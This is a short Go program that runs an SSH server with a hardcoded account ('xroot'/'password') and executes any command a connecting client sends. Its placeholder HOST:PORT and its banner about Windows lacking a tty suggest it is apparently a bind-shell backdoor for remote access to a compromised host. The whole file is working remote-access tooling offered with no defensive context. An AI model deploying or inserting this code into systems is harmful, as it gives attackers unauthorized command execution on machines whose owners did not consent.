package main

import (
	"io"
	"os/exec"
	"strings"

	"github.com/gliderlabs/ssh"
	"golang.org/x/term"
)

const (
	PASSWORD = "password"
	USERNAME = "xroot"
)

func simpleCommandShellHandler(s ssh.Session) {
	term := term.NewTerminal(s, ">")
	for {
		line, err := term.ReadLine()
		if err != nil {
			break
		}
		in := strings.Split(line, " ")
		if in[0] == "" {
			continue
		}
		if in[0] == "exit" {
			break
		}
		exe := exec.Command(in[0], in[1:]...)
		out, err := exe.Output()
		if err != nil {
			term.Write([]byte(err.Error() + "\n"))
		}
		term.Write(out)
	}
}

func main() {
	ssh.ListenAndServe("HOST:PORT", func(s ssh.Session) {
		io.WriteString(s, "\n[-] Windows dont have tty, using simple command shell.\n")
		simpleCommandShellHandler(s)
	},
		ssh.PasswordAuth(func(ctx ssh.Context, pass string) bool {
			return pass == PASSWORD && ctx.User() == USERNAME
		}),
	)
}
